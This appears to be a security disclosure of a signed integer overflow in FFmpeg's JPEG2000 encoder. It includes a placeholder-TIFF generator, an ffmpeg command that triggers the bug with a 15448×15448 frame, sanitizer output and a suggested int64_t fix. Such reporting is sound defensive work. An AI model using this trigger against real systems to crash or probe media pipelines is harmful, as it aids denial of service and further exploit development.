## Bug0: Signed Integer Overflow in JPEG2000 Encoder Packet Size Calculation

### Summary

In `libavcodec/j2kenc.c` at line 1482, `encode_frame()` computes the output packet buffer size as `avctx->width * avctx->height * 9 + FF_INPUT_BUFFER_MIN_SIZE` entirely in signed 32-bit integer arithmetic. For frames with dimensions such as 15448×15448, the intermediate product `238,640,704 × 9 = 2,147,766,336` exceeds INT32_MAX (2,147,483,647), invoking signed integer overflow — undefined behavior under the C standard (CWE-190). In the tested UBSan build the wrapped negative result is rejected by `ff_alloc_packet`, aborting encoding; in an optimized non-sanitized build the same UB could yield a small positive size (e.g., ~25 MB for 30000×16000 before that specific dimension is blocked elsewhere), potentially enabling a heap buffer overflow (CWE-122).

### PoC

A Python script generates a minimal 1×1 TIFF placeholder for documentation; the actual overflow trigger uses FFmpeg's rawvideo demuxer with `/dev/zero` to feed a 15448×15448 grayscale frame directly to the JPEG2000 encoder.

```python
#!/usr/bin/env python3
"""
PoC placeholder generator for the signed integer overflow in j2kenc.c:1482.
The actual overflow trigger is the ffmpeg command in the bash block below.
"""
import struct

OUTPUT = "vuln_001_input.tiff"

def write_minimal_tiff():
    num_entries = 12
    ifd_size = 2 + num_entries * 12 + 4
    data_offset = 8 + ifd_size   # 158
    bps_at  = data_offset        # 158
    xres_at = bps_at + 6         # 164
    yres_at = xres_at + 8        # 172
    pixel_at = yres_at + 8       # 180

    width, height, spp = 1, 1, 3
    entries = [
        struct.pack('<HHII', 256, 3, 1, width),
        struct.pack('<HHII', 257, 3, 1, height),
        struct.pack('<HHII', 258, 3, 3, bps_at),
        struct.pack('<HHII', 259, 3, 1, 1),
        struct.pack('<HHII', 262, 3, 1, 2),
        struct.pack('<HHII', 273, 4, 1, pixel_at),
        struct.pack('<HHII', 277, 3, 1, spp),
        struct.pack('<HHII', 278, 3, 1, height),
        struct.pack('<HHII', 279, 4, 1, width * height * spp),
        struct.pack('<HHII', 282, 5, 1, xres_at),
        struct.pack('<HHII', 283, 5, 1, yres_at),
        struct.pack('<HHII', 296, 3, 1, 2),
    ]

    data = bytearray()
    data += b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
    data += struct.pack('<H', num_entries)
    for e in entries:
        data += e
    data += struct.pack('<I', 0)          # no next IFD
    data += struct.pack('<HHH', 8, 8, 8) # BitsPerSample
    data += struct.pack('<II', 72, 1)    # XResolution 72/1
    data += struct.pack('<II', 72, 1)    # YResolution 72/1
    data += bytes([0xFF, 0xFF, 0xFF])    # 1x1 RGB pixel

    with open(OUTPUT, 'wb') as f:
        f.write(data)
    print(f"[+] Placeholder TIFF written: {OUTPUT}")
    print("[+] Overflow: 15448*15448*9 = 2,147,766,336 > INT32_MAX at j2kenc.c:1482")

if __name__ == '__main__':
    write_minimal_tiff()
```

```bash
# (Optional) generate placeholder TIFF for documentation
python3 vuln_001_gen.py

# Trigger signed integer overflow in the JPEG2000 encoder.
# Uses /dev/zero as rawvideo source — no large disk file needed.
# NOTE: ASAN+UBSan overhead means this may take ~60 seconds.
ffmpeg \
  -probesize 32 \
  -f rawvideo -video_size 15448x15448 -pixel_format gray8 -framerate 1 -i /dev/zero \
  -c:v jpeg2000 -tile_width 32768 -tile_height 32768 \
  -frames:v 1 -f null -
```

### Result

Running on a UBSan-enabled build triggers the signed integer overflow at `j2kenc.c:1482:70`:

```
src/libavcodec/j2kenc.c:1482:70: runtime error: signed integer overflow: 238640704 * 9 cannot be represented in type 'int'
[jpeg2000 @ 0x519000011380] Invalid minimum required packet size -2147184576 (max allowed is 2147483583)
[vost#0:0/jpeg2000 @ ...] Error submitting video frame to the encoder
[vost#0:0/jpeg2000 @ ...] Error flushing encoder: Invalid argument
```

The expression `15448 × 15448 × 9 = 2,147,766,336` overflows int32, wrapping to `-2,147,184,576`. The current build's `ff_alloc_packet` rejects the negative size and aborts safely, but the arithmetic constitutes confirmed undefined behavior (CWE-190) that an optimizing compiler may transform arbitrarily. Without the downstream size guard, the same overflow path would produce a severely undersized allocation and enable a heap buffer overflow (CWE-122). The fix is to cast at least one operand to `int64_t` before multiplication.
